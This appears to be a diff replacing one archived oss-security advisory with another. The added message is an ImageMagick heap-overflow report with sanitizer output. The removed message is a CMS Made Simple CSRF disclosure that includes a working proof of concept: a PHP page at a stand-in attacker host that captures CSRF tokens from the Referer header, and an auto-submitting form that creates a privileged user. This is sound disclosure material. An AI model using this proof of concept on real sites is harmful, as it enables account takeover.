@@ -1,76 +1,119 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/16/1
-Message-ID: <15f7b5fc.102.159a510a8eb.Coremail.hongkun.zeng@dbappsecurity.com.cn>
-Date: Mon, 16 Jan 2017 10:17:29 +0800 (GMT+08:00)
-From: "Hongkun Zeng" <hongkun.zeng@...ppsecurity.com.cn>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: CVE-2016-7904: CMS Made Simple <= 2.1.5 CSRF
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/08/16/3
+Message-ID: <540309.755920561-sendEmail@localhost>
+Date: Wed, 16 Aug 2017 11:52:54 +0000
+From: "Agostino Sarubbo" <ago@...too.org>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: imagemagick: heap-based buffer overflow in .omp_outlined..32 (enhance.c)
 Content-Type: text/plain; charset=utf-8
 
-Vulnerability: CVE-2016-7904: CMS Made Simple <= 2.1.5 CSRF
-CVE: CVE-2016-7904
-Discovered by: Hongkun Zeng (http://www.dbappsecurity.com.cn/)
+Description:
+imagemagick is a software suite to create, edit, compose, or convert bitmap images.
 
+The complete ASan output of the issue:
 
-CMS Made Simple (CMSMS) is a free, open source (GPL) content management system (CMS) to provide developers, programmers and site owners a web-based development and administration area.
+# convert $FILE null
+==109188==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000049f8 at pc 0x7f81ecd9b4c2 bp 0x7ffe3c52f850 sp 0x7ffe3c52f848
+READ of size 8 at 0x6020000049f8 thread T0   
+    #0 0x7f81ecd9b4c1 in .omp_outlined..32 /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/enhance.c:1248:13  
+    #1 0x7f81eb8395c2 in __kmp_invoke_microtask /var/tmp/portage/sys-libs/libomp-4.0.1/work/openmp-4.0.1.src/runtime/src/z_Linux_asm.s:1399 
+    #2 0x7f81eb7e125a in __kmp_fork_call /var/tmp/portage/sys-libs/libomp-4.0.1/work/openmp-4.0.1.src/runtime/src/kmp_runtime.cpp:1858 
+    #3 0x7f81eb7cd74f in __kmpc_fork_call /var/tmp/portage/sys-libs/libomp-4.0.1/work/openmp-4.0.1.src/runtime/src/kmp_csupport.cpp:337
+    #4 0x7f81ecd999b9 in ContrastStretchImage /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/enhance.c:1213:11    
+    #5 0x7f81ecbd2280 in SetImageType /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/attribute.c:1262:18
+    #6 0x7f81e5acd5bd in WriteTIFFImage /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/coders/tiff.c:3245:16  
+    #7 0x7f81eccc4026 in WriteImage /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/constitute.c:1114:14 
+    #8 0x7f81eccc55a9 in WriteImages /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/constitute.c:1333:13
+    #9 0x7f81ec50f456 in ConvertImageCommand /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickWand/convert.c:3280:11
+    #10 0x7f81ec62e225 in MagickCommandGenesis /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickWand/mogrify.c:183:14    
+    #11 0x5093e9 in MagickMain /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/utilities/magick.c:149:10  
+    #12 0x5093e9 in main /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/utilities/magick.c:180 
+    #13 0x7f81eb206680 in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.23-r4/work/glibc-2.23/csu/../csu/libc-start.c:289   
+    #14 0x41a1f8 in _init (/usr/bin/magick+0x41a1f8)   
 
+0x6020000049f8 is located 0 bytes to the right of 8-byte region [0x6020000049f0,0x6020000049f8)
+allocated by thread T0 here:  
+    #0 0x4cfba8 in malloc /var/tmp/portage/sys-libs/compiler-rt-sanitizers-4.0.1/work/compiler-rt-4.0.1.src/lib/asan/asan_malloc_linux.cc:66
+    #1 0x7f81ecef8df7 in AcquireMagickMemory /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/memory.c:464:10  
+    #2 0x7f81ecef8df7 in AcquireQuantumMemory /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/memory.c:537    
+    #3 0x7f81ecd97037 in ContrastStretchImage /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/enhance.c:1052:20    
+    #4 0x7f81ecbd2280 in SetImageType /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/attribute.c:1262:18
+    #5 0x7f81e5acd5bd in WriteTIFFImage /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/coders/tiff.c:3245:16
+    #6 0x7f81eccc4026 in WriteImage /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/constitute.c:1114:14
+    #7 0x7f81eccc55a9 in WriteImages /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/constitute.c:1333:13
+    #8 0x7f81ec50f456 in ConvertImageCommand /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickWand/convert.c:3280:11
+    #9 0x7f81ec62e225 in MagickCommandGenesis /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickWand/mogrify.c:183:14
+    #10 0x5093e9 in MagickMain /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/utilities/magick.c:149:10
+    #11 0x5093e9 in main /var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/utilities/magick.c:180
+    #12 0x7f81eb206680 in __libc_start_main /var/tmp/portage/sys-libs/glibc-2.23-r4/work/glibc-2.23/csu/../csu/libc-start.c:289
 
-This is a security issue in CMSMS. Low privilege users were able to gain control of an administrative session through a CSRF attack.
+SUMMARY: AddressSanitizer: heap-buffer-overflow 
+/var/tmp/portage/media-gfx/imagemagick-7.0.6.5/work/ImageMagick-7.0.6-5/MagickCore/enhance.c:1248:13 in .omp_outlined..32
+Shadow bytes around the buggy address:
+  0x0c047fff88e0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
+  0x0c047fff88f0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
+  0x0c047fff8900: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
+  0x0c047fff8910: fa fa fd fd fa fa fd fd fa fa fd fd fa fa fd fd
+  0x0c047fff8920: fa fa 00 03 fa fa 00 04 fa fa 05 fa fa fa 00 00
+=>0x0c047fff8930: fa fa 00 07 fa fa 00 04 fa fa 00 04 fa fa 00[fa]
+  0x0c047fff8940: fa fa 00 fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c047fff8950: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c047fff8960: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c047fff8970: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0c047fff8980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==109188==ABORTING
 
+Affected version:
+7.0.6-5
 
-Add article and insert image with link http://attacker/csrfpoc.php, and the referer would leak the users' csrf token.
+Fixed version:
+7.0.6-6 (not released atm)
 
+Commit fix:
+https://github.com/ImageMagick/ImageMagick/commit/1cc6f0ccc92c20c7cab6c4a7335daf29c91f0d8e
 
-POC:
-```
-//File: csrfpoc.php
-<?php
-session_start();
+Credit:
+This bug was discovered by Agostino Sarubbo of Gentoo.
 
+CVE:
+CVE-2017-12876
 
-if(!isset($_SERVER['HTTP_REFERER']) && !isset($_SESSION['_sk_']))
-exit;
+Reproducer:
+https://github.com/asarubbo/poc/blob/master/00306-imagemagick-heapoverflow-enhance_c
 
+Timeline:
+2017-08-09: bug discovered and reported to upstream
+2017-08-10: blog post about the issue
+2017-08-15: CVE assigned
 
-if(isset($_SERVER['HTTP_REFERER'])){
-$parsed_url = parse_url($_SERVER['HTTP_REFERER']);
-$query = isset($parsed_url['query']) ? '?' . $parsed_url['query'] : '';
-parse_str("$query",$arr);
-if(isset($arr['_sk_'])){
-$_SESSION['_sk_'] = $arr['_sk_'];
-}
-}
-if(!isset($_SESSION['_sk_']))
-exit;
-?>
+Note:
+This bug was found with American Fuzzy Lop.
+This bug was identified with bare metal servers donated by Packet. This work is also supported by the Core Infrastructure Initiative.
 
-
-<form action='http://localhost:8012/admin/adduser.php' method='POST' id='form' enctype='multipart/form-data'>
-<input type="text" name="_sk_" value="<?php echo $_SESSION['_sk_'];?>" />
-<input type="text" name="user" value="test" />
-<input type="text" name="password" value="123456" />
-<input type="text" name="passwordagain" value="123456" />
-<input type="text" name="firstname" value="" />
-<input type="text" name="lastname" value="" />
-<input type="text" name="email" value="" />
-<input type="text" name="active" value="1" />
-<input type="text" name="sel_groups[]" value="1" />
-<input type="text" name="sel_groups[]" value="2" />
-<input type="text" name="sel_groups[]" value="3" />
-<input type="text" name="copyusersettings" value="-1" />
-<input type="text" name="submit" value="submit" />
-</form>
-<script> document.createElement('form').submit.call(document.getElementById('form')); </script> 
-```
-
-
-Ref:
-http://dev.cmsmadesimple.org/project/changelog/5392
-
+Permalink:
+https://blogs.gentoo.org/ago/2017/08/10/imagemagick-heap-based-buffer-overflow-in-omp_outlined-32-enhance-c/
 
 --
+Agostino Sarubbo
+Gentoo Linux Developer
 
-Best Regards,
-Hongkun Zeng
----------------------------------------------------
-hongkun.zeng (at) dbappsecurity.com.cn
+
